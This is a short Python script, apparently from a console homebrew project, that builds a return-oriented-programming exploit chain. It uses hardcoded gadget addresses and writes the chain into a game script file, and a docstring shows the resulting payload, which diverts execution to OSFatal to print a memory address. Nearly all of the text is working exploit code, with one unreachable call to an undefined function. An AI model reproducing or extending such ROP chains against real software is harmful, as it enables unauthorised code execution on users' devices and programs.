# Addresses
LOAD_R3_ADDR = 0x0C00C650
OSFATAL_ADDR = 0x01031618

class PayloadAddress:
    pass

CHAIN_END = "#Execute ROP chain\nexit\n\n#Dunno why but I figured I might as well put it here, should never hit this though\nend"

def write_rop_chain(rop_chain, path):
    with open('rop_setup.s', 'r') as f:
        setup = f.read()
    with open(path, 'w') as f:
        print(setup, file=f)
        for command in rop_chain:
            if isinstance(command, PayloadAddress):
                print("pushVar. globalVar,mscScriptAddress", file=f)
            elif isinstance(command, int):
                print(f"pushInt. {hex(command)}", file=f)
            else:
                raise Exception(f"Found invalid type {type(command)} in rop_chain")
        print(CHAIN_END, file=f)


"""
Example payload (writeOSFatalPayload func)

pushInt. 0xC00C650
pushVar. globalVar,mscScriptAddress #r3 value (will be printed by OSFatal)
pushInt. 0xBEEF0001
pushInt. 0xBEEF0002
pushInt. 0xBEEF0003
pushInt. 0xBEEF0004
pushInt. 0xBEEF0005
pushInt. 0xBEEF0006
pushInt. 0xBEEF0007
pushInt. 0xBEEF0008
pushInt. 0xBEEF0009
pushInt. 0xBEEF000A
pushInt. 0xBEEF000B
pushInt. 0xBEEF000C
pushInt. 0xBEEF000D
pushInt. 0xBEEF000E
pushInt. 0xBEEF000F
pushInt. 0xBEEF0010
pushInt. 0xBEEF0011
pushInt. 0xBEEF0012
pushInt. 0xBEEF0013
pushInt. 0xBEEF0014
pushInt. 0xBEEF0015
pushInt. 0xBEEF0016
pushInt. 0xBEEF0017
pushInt. 0xBEEF0018
pushInt. 0xBEEF0019
pushInt. 0xBEEF001A
pushInt. 0x01031618 #return address (OSFatal)

"""

# Print out contents of payload as null terminated string
def generateOSFatalPayload():
    return [
        LOAD_R3_ADDR,
        PayloadAddress()
    ] + [
        0xBEEF0001 + i for i in range(0x1A)
    ] + [
        OSFATAL_ADDR
    ]
    writeEnd()


def main():
    rop_chain = generateOSFatalPayload()
    write_rop_chain(rop_chain, 'main.s')

if __name__ == "__main__":
    main()
